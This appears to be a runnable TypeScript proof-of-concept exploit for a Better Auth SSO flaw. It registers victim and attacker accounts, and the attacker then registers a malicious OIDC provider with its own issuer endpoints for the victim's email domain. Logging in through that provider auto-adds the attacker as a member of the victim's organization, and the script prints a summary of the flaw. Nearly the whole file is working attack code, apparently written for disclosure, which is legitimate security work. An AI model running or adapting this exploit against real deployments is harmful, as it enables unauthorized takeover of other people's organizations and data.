import { Organization } from "better-auth/plugins";

const registerAccount = async ({
    name,
    email,
    password,
}: {
    name: string;
    email: string;
    password: string;
}) => {
    const registerResponse = await fetch("https://dev.untraceable.dev/api/auth/sign-up/email", {
        body: JSON.stringify({ name, email, password }),
        method: "POST",
        headers: { "Content-Type": "application/json" }
    })
    
    if (registerResponse.ok) {
        console.log(`✓ Registered ${email}`)
        return registerResponse.headers.get("Set-Cookie")!
    }
    
    if (registerResponse.status === 422) {
        const loginResponse = await fetch("https://dev.untraceable.dev/api/auth/sign-in/email", {
            body: JSON.stringify({ email, password }),
            method: "POST",
            headers: { "Content-Type": "application/json" }
        })
        
        if (loginResponse.ok) {
            console.log(`✓ Logged in ${email}`)
            return loginResponse.headers.get("Set-Cookie")!
        }
    }
    
    throw new Error(`Failed to authenticate ${email}`)
}

const registerThroughSSO = async () => {
    // Initiate SSO login
    const response = await fetch("https://dev.untraceable.dev/api/auth/sign-in/sso", {
        body: JSON.stringify({
            domain: "innocent.org",
            callbackURL: "/",
        }),
        method: "POST",
        headers: { "Content-Type": "application/json" }
    })
    
    if (!response.ok) {
        throw new Error("Failed to initiate SSO login")
    }
    
    const ssoData = await response.json()
    
    // Follow authorization URL (simulating browser redirect)
    const authResponse = await fetch(ssoData.url, {
        redirect: "manual"
    })
    
    const callbackUrl = authResponse.headers.get("Location")

    if (!callbackUrl) {
        throw new Error("No redirect from SSO provider")
    }
    
    // Complete the flow and get session
    const callbackResponse = await fetch(callbackUrl, {
        redirect: "manual"
    })

    return callbackResponse.headers.get("Set-Cookie")!
}

const registerOrganization = async (cookies: string): Promise<Organization> => {
    const response = await fetch("https://dev.untraceable.dev/api/auth/organization/create", {
        body: JSON.stringify({
            name: "Test Organization",
            slug: "test-organization",
        }),
        headers: {
            "Content-Type": "application/json",
            "Cookie": cookies,
        },
        method: "POST",
    })
    
    if (response.ok) {
        console.log("✓ Created organization")
        return await response.json()
    }
    
    throw new Error("Failed to create organization")
}

const listOrganizations = async (cookies: string): Promise<Organization[]> => {
    const response = await fetch("https://dev.untraceable.dev/api/auth/organization/list", {
        headers: {
            "Content-Type": "application/json",
            "Cookie": cookies,
        },
        method: "GET",
    })
    
    if (response.ok) {
        return await response.json()
    }
    
    throw new Error("Failed to list organizations")
}

const registerSSOProvider = async (cookies: string, organizationId: string) => {
    const maliciousIssuer = "https://api.untraceable.dev"

    const response = await fetch("https://dev.untraceable.dev/api/auth/sso/register", {
        body: JSON.stringify({
            providerId: "fakeattackersprovider",
            issuer: maliciousIssuer,
            domain: "innocent.org",
            clientId: "it-doesn't-matter",
            clientSecret: "it-doesn't-matter",
            pkce: false,
            discoveryEndpoint: `${maliciousIssuer}/.well-known/openid-configuration`,
            authorizationEndpoint: `${maliciousIssuer}/auth`,
            tokenEndpoint: `${maliciousIssuer}/token`,
            userInfoEndpoint: `${maliciousIssuer}/me`,
            jwksEndpoint: `${maliciousIssuer}/jwks`,
            organizationId
        }),
        headers: {
            "Content-Type": "application/json",
            "Cookie": cookies,
        },
        method: "POST",
    })
    
    if (response.ok) {
        console.log("✓ Registered malicious SSO provider")
        return await response.json()
    }
    
    throw new Error("Failed to register SSO provider")
}

const getCurrentSession = async (cookies: string) => {
    const response = await fetch("https://dev.untraceable.dev/api/auth/get-session", {
        headers: {
            "Content-Type": "application/json",
            "Cookie": cookies,
        }
    })
    
    if (response.ok) {
        return await response.json()
    }
    
    throw new Error("Failed to get session")
}

const listMembers = async (cookies: string, organizationId: string) => {
    const response = await fetch(`https://dev.untraceable.dev/api/auth/organization/list-members?organizationId=${organizationId}`, {
        method: "GET",
        headers: {
            "Content-Type": "application/json",
            "Cookie": cookies,
        }
    })
    
    if (response.ok) {
        const data =  await response.json()
        return data.members
    }
    
    throw new Error("Failed to list members")
}

console.log("=== Better Auth SSO Vulnerability PoC ===\n")

// Step 1: Setup victim and attacker accounts
const victimSession = await registerAccount({
    email: "victim@innocent.org",
    name: "Innocent Victim",
    password: "supersecurepassword123!"
})

const attackerSession = await registerAccount({
    email: "attacker@attacker.org",
    name: "Malicious Attacker",
    password: "maliciouspassword456!"
})

// Step 2: Victim creates an organization
const victimOrg = (await listOrganizations(victimSession))[0] || await registerOrganization(victimSession)
console.log(`✓ Victim organization: ${victimOrg.name} (${victimOrg.id})\n`)

// Step 3: Attacker registers malicious SSO provider for victim's org
await registerSSOProvider(attackerSession, victimOrg.id)
console.log(`✓ Attacker registered SSO for domain: innocent.org\n`)

// Step 4: Attacker logs in via SSO and gains access to victim's org
console.log("→ Executing SSO attack...")
const attackerInVictimOrgSession = await registerThroughSSO()
const attackerSessionData = await getCurrentSession(attackerInVictimOrgSession)

console.log("\n=== ATTACK RESULT ===")
console.log("Attacker logged in as:", attackerSessionData.user.email)
console.log("Active member:", attackerSessionData.activeMember)

// Check if attacker was added to the victim's org
console.log("\n→ Checking organization membership...")
const victimOrgMembers = await listMembers(victimSession, victimOrg.id)
const attackerAsMember = victimOrgMembers.find((m: any) => m.user.email === attackerSessionData.user.email)

if (attackerAsMember) {
    console.log("\n🚨 CRITICAL VULNERABILITY CONFIRMED 🚨")
    console.log("Attacker successfully joined victim's organization!")
    console.log("Attacker role:", attackerAsMember.role)
    console.log("Attacker user:", attackerAsMember.user)
    
    // Verify attacker can access organization resources
    console.log("\n→ Verifying attacker can access victim's org...")
    const attackerOrgList = await listOrganizations(attackerInVictimOrgSession)
    const hasAccessToVictimOrg = attackerOrgList.some((org: any) => org.id === victimOrg.id)
    
    if (hasAccessToVictimOrg) {
        console.log("✅ Attacker can see victim's organization in their org list")
        console.log("✅ Attacker has full member access to:", victimOrg.name)
    }
    
    console.log("\n=== VULNERABILITY SUMMARY ===")
    console.log("1. Missing Authorization: Any user can register SSO for ANY organization")
    console.log("2. Auto-Provisioning: SSO users are automatically added as members")
    console.log("3. Impact: Complete unauthorized access to victim's organization")
} else {
    console.log("\n⚠️ Attacker was NOT added to organization")
    console.log("Auto-provisioning may be disabled or requires additional configuration")
}
